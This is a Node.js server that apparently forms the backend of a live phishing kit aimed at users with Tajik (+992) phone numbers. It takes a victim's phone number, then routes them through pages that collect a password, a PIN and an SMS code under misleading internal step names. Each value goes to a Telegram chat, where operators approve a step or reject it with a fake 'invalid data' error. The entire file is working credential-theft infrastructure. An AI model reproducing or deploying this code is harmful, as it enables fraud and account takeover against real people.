const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 3000;

const DATA_DIR = path.join(__dirname, "data");
const DATA_FILE = path.join(DATA_DIR, "clients.json");
const INVALID_MESSAGE = "Лутфан маълумоти дурустро ворид кунед.";
const STATUS_TO_PAGE = {
  phone: "/phone.html",
  waiting: "/waiting.html",
  name: "/name.html",
  birth_year: "/birth-year.html",
  age: "/age.html",
  residence_year: "/residence-year.html",
  approved: "/approved.html"
};
const ROUTE_ACTIONS = {
  name: "name",
  birth_year: "birth_year",
  age: "age",
  residence_year: "residence_year",
  approve: "approved"
};
const STATUS_LABELS = {
  phone: "Телефон",
  waiting: "Ожидание",
  name: "Имя",
  birth_year: "ПИН",
  age: "SMS",
  residence_year: "Год проживания",
  approved: "Завершено"
};

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const ensureStore = () => {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }

  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(
      DATA_FILE,
      JSON.stringify({ clients: {}, telegram: { lastUpdateId: 0 } }, null, 2),
      "utf8"
    );
  }
};

const readStore = () => {
  ensureStore();
  return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
};

const writeStore = (store) => {
  ensureStore();
  fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2), "utf8");
};

const updateStore = (updater) => {
  const store = readStore();
  const nextStore = updater(store) || store;
  writeStore(nextStore);
  return nextStore;
};

const createClientId = () => crypto.randomBytes(6).toString("hex");

const addHistory = (client, entry) => {
  client.history = client.history || [];
  client.history.push({
    ...entry,
    at: new Date().toISOString()
  });
};

const createClient = (phone) => {
  const now = new Date().toISOString();
  const client = {
    id: createClientId(),
    phone,
    status: "waiting",
    ownerTag: "",
    ownerId: "",
    pendingReviewStep: "phone",
    lastCompletedStep: "phone",
    currentError: "",
    createdAt: now,
    updatedAt: now,
    submissions: {
      phone: {
        value: phone,
        at: now
      }
    },
    history: [
      { type: "created", status: "waiting", at: now },
      { type: "submission", step: "phone", at: now }
    ]
  };

  updateStore((store) => {
    store.clients[client.id] = client;
    return store;
  });

  return client;
};

const getClient = (id) => {
  const store = readStore();
  return store.clients[id] || null;
};

const updateClient = (id, updater) => {
  let updatedClient = null;

  updateStore((store) => {
    const client = store.clients[id];
    if (!client) return store;

    updater(client);
    client.updatedAt = new Date().toISOString();
    updatedClient = client;
    return store;
  });

  return updatedClient;
};

const setLastUpdateId = (updateId) => {
  updateStore((store) => {
    store.telegram = store.telegram || {};
    store.telegram.lastUpdateId = updateId;
    return store;
  });
};

const getLastUpdateId = () => {
  const store = readStore();
  return store.telegram?.lastUpdateId || 0;
};

const maskPhone = (phone) => {
  const digits = String(phone || "").replace(/\D/g, "");
  if (digits.length < 6) return phone;
  return `+${digits.slice(0, 3)}(${digits.slice(3, 5)})${digits.slice(5, 8)}****${digits.slice(-2)}`;
};

const buildActionKeyboard = (clientId, selectedAction = "") => {
  const button = (actionKey, text) => ({
    text: selectedAction === actionKey ? `✅ ${text}` : text,
    callback_data: actionKey === "reject" ? `reject|${clientId}` : `route|${actionKey}|${clientId}`
  });

  return {
    inline_keyboard: [
      [button("reject", "Отклонить")],
      [button("name", "Направить на пароль")],
      [button("birth_year", "Направить на ПИН")],
      [button("age", "Направить на SMS")],
      [button("approve", "Завершить")]
    ]
  };
};

const telegramApi = async (method, payload) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) {
    throw new Error("Telegram bot token is missing.");
  }

  const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  });

  const data = await response.json();
  return { response, data };
};

const sendTelegramMessage = async (chatId, text, replyMarkup) => {
  let { response, data } = await telegramApi("sendMessage", {
    chat_id: chatId,
    text,
    reply_markup: replyMarkup
  });

  if ((!response.ok || !data.ok) && data?.parameters?.migrate_to_chat_id) {
    const migratedChatId = String(data.parameters.migrate_to_chat_id);
    ({ response, data } = await telegramApi("sendMessage", {
      chat_id: migratedChatId,
      text,
      reply_markup: replyMarkup
    }));
  }

  return { response, data };
};

const editTelegramMessage = async (chatId, messageId, text, replyMarkup) => {
  const { response, data } = await telegramApi("editMessageText", {
    chat_id: chatId,
    message_id: messageId,
    text,
    reply_markup: replyMarkup
  });

  return { response, data };
};

const answerTelegramCallback = async (callbackQueryId, text) => {
  const { data } = await telegramApi("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text
  });

  return data;
};

const routeForStatus = (status, clientId) => {
  const page = STATUS_TO_PAGE[status] || STATUS_TO_PAGE.phone;
  return `${page}?client=${clientId}`;
};

const buildClientMessageText = (client, title, details = []) =>
  [
    title,
    "",
    `Телефон: ${client.phone}`,
    `ID клиента: ${client.id}`,
    ...details
  ].join("\n");

const sendClientNotification = async (client, title, details, includeKeyboard = true) => {
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!chatId) {
    throw new Error("Telegram chat id is missing.");
  }

  return sendTelegramMessage(
    chatId,
    buildClientMessageText(client, title, details),
    includeKeyboard ? buildActionKeyboard(client.id) : undefined
  );
};

const normalizeInputValue = (step, value) => {
  const text = String(value || "").trim();

  if (step === "phone") {
    const digits = text.replace(/\D/g, "");
    if (digits.length !== 12 || !digits.startsWith("992")) return null;
    return `+${digits}`;
  }

  if (step === "name") {
    const normalized = text.replace(/\s+/g, " ").trim();
    if (normalized.length < 2 || normalized.length > 60) return null;
    return normalized;
  }

  const digits = text.replace(/\D/g, "");
  if (!digits) return null;

  if (step === "residence_year") {
    if (digits.length !== 4) return null;
  }

  if (step === "age") {
    if (digits.length < 1) return null;
  }

  return digits;
};

const sendNewClientNotification = async (client) =>
  sendClientNotification(client, "Новая заявка клиента", []);

const sendStepSubmissionNotification = async (client, step, value) =>
  sendClientNotification(client, `Клиент отправил ${String(STATUS_LABELS[step] || step).toLowerCase()}`, [
    `Значение: ${value}`,
    ...(resolveClientOwnerTag(client) ? [`Взял: ${resolveClientOwnerTag(client)}`] : [])
  ]);

const getTelegramActorTag = (from) => {
  if (!from) return "unknown";
  if (from.username) return `@${from.username}`;
  if (from.first_name || from.last_name) {
    return [from.first_name, from.last_name].filter(Boolean).join(" ");
  }
  return String(from.id || "unknown");
};

const assignClientOwner = (clientId, from) =>
  updateClient(clientId, (client) => {
    if (client.ownerTag) {
      return;
    }

    client.ownerTag = getTelegramActorTag(from);
    client.ownerId = String(from?.id || "");
    addHistory(client, {
      type: "owner_assigned",
      ownerTag: client.ownerTag,
      source: "telegram"
    });
  });

const resolveClientOwnerTag = (client) => client?.ownerTag || "";

const updateTelegramActionMessage = async (callbackQuery, client, actionKey) => {
  const chatId = callbackQuery?.message?.chat?.id;
  const messageId = callbackQuery?.message?.message_id;

  if (!chatId || !messageId) {
    return;
  }

  const actorTag = resolveClientOwnerTag(client) || getTelegramActorTag(callbackQuery.from);
  const latestStepKey = client.pendingReviewStep || client.lastCompletedStep;
  const latestValue = latestStepKey ? client.submissions?.[latestStepKey]?.value : "";
  const details = [];

  if (latestValue) {
    details.push(`Значение: ${latestValue}`);
  }

  details.push(`Взял: ${actorTag}`);

  try {
    await editTelegramMessage(
      chatId,
      messageId,
      buildClientMessageText(client, "Новая заявка клиента", details),
      buildActionKeyboard(client.id, actionKey)
    );
  } catch (error) {
    console.error("Could not update Telegram action message:", error.message);
  }
};

const submitStepForReview = async (client, step, value) => {
  const updatedClient = updateClient(client.id, (draft) => {
    draft.currentError = "";
    draft.pendingReviewStep = step;
    draft.lastCompletedStep = step;
    draft.status = "waiting";
    draft.submissions[step] = {
      value,
      at: new Date().toISOString()
    };

    if (step === "phone") {
      draft.phone = value;
    }

    addHistory(draft, { type: "submission", step });
    addHistory(draft, { type: "status_change", status: "waiting", source: "submit" });
  });

  if (step === "phone" && client.createdAt === client.updatedAt) {
    return sendNewClientNotification(updatedClient);
  }

  return sendStepSubmissionNotification(updatedClient, step, value);
};

const startTelegramPolling = async () => {
  if (!process.env.TELEGRAM_BOT_TOKEN) {
    console.log("Telegram polling skipped: missing TELEGRAM_BOT_TOKEN");
    return;
  }

  try {
    await telegramApi("deleteWebhook", { drop_pending_updates: false });
  } catch (error) {
    console.error("Could not disable Telegram webhook:", error.message);
  }

  let offset = getLastUpdateId();

  const loop = async () => {
    try {
      const { data } = await telegramApi("getUpdates", {
        offset,
        timeout: 20,
        allowed_updates: ["callback_query"]
      });

      if (data?.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          offset = update.update_id + 1;
          setLastUpdateId(offset);
          await handleTelegramUpdate(update);
        }
      }
    } catch (error) {
      console.error("Telegram polling error:", error.message);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }

    setImmediate(loop);
  };

  loop();
};

const handleReject = (clientId) =>
  updateClient(clientId, (client) => {
    const targetStep = client.pendingReviewStep || client.lastCompletedStep || "phone";
    client.status = targetStep;
    client.currentError = INVALID_MESSAGE;
    addHistory(client, { type: "status_change", status: targetStep, source: "telegram_reject" });
  });

const handleRoute = (clientId, action) =>
  updateClient(clientId, (client) => {
    const nextStatus = ROUTE_ACTIONS[action];
    if (!nextStatus) return;
    client.status = nextStatus;
    client.currentError = "";
    client.pendingReviewStep = "";
    addHistory(client, { type: "status_change", status: nextStatus, source: "telegram_route" });
  });

const handleTelegramUpdate = async (update) => {
  const callbackQuery = update?.callback_query;
  if (!callbackQuery?.data || !callbackQuery.id) return;

  const parts = callbackQuery.data.split("|");
  const [type, arg1, arg2] = parts;

  let client = null;
  let answer = "Действие выполнено.";

  if (type === "reject") {
    assignClientOwner(arg1, callbackQuery.from);
    client = handleReject(arg1);
    answer = "Клиент возвращен на предыдущий шаг с ошибкой.";
  } else if (type === "route") {
    assignClientOwner(arg2, callbackQuery.from);
    client = handleRoute(arg2, arg1);
    answer = `Клиент направлен: ${STATUS_LABELS[ROUTE_ACTIONS[arg1]] || arg1}`;
  }

  if (!client) {
    await answerTelegramCallback(callbackQuery.id, "Клиент не найден или действие неверно.");
    return;
  }

  await updateTelegramActionMessage(
    callbackQuery,
    client,
    type === "reject" ? "reject" : arg1
  );

  await answerTelegramCallback(callbackQuery.id, answer);
};

app.post("/api/submit-phone", async (req, res) => {
  const phone = normalizeInputValue("phone", req.body?.phone);

  if (!phone) {
    return res.status(400).json({ ok: false, message: "Phone is invalid." });
  }

  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    return res.status(500).json({
      ok: false,
      message: "Telegram credentials are not configured on the server."
    });
  }

  const client = createClient(phone);

  try {
    const { response, data } = await sendNewClientNotification(client);

    if (!response.ok || !data.ok) {
      return res.status(502).json({
        ok: false,
        message: "Telegram API request failed.",
        details: data
      });
    }

    return res.json({
      ok: true,
      clientId: client.id,
      redirectUrl: routeForStatus("waiting", client.id)
    });
  } catch (error) {
    return res.status(500).json({
      ok: false,
      message: "Could not send data to Telegram.",
      error: error.message
    });
  }
});

app.get("/api/client/:id", (req, res) => {
  const client = getClient(req.params.id);

  if (!client) {
    return res.status(404).json({ ok: false, message: "Client not found." });
  }

  return res.json({
    ok: true,
    client: {
      id: client.id,
      status: client.status,
      phone: client.phone,
      ownerTag: client.ownerTag || "",
      maskedPhone: maskPhone(client.phone),
      redirectUrl: routeForStatus(client.status, client.id),
      submissions: client.submissions,
      currentError: client.currentError || ""
    }
  });
});

app.post("/api/client/:id/submit-step", async (req, res) => {
  const client = getClient(req.params.id);
  const step = req.body?.step;
  const normalizedValue = normalizeInputValue(step, req.body?.value);

  if (!client) {
    return res.status(404).json({ ok: false, message: "Client not found." });
  }

  if (!["phone", "name", "birth_year", "age", "residence_year"].includes(step) || !normalizedValue) {
    return res.status(400).json({ ok: false, message: "Invalid step payload." });
  }

  try {
    const { response, data } = await submitStepForReview(client, step, normalizedValue);

    if (!response.ok || !data.ok) {
      return res.status(502).json({
        ok: false,
        message: "Telegram API request failed.",
        details: data
      });
    }

    return res.json({
      ok: true,
      redirectUrl: routeForStatus("waiting", client.id)
    });
  } catch (error) {
    return res.status(500).json({
      ok: false,
      message: "Could not send data to Telegram.",
      error: error.message
    });
  }
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
  startTelegramPolling();
});
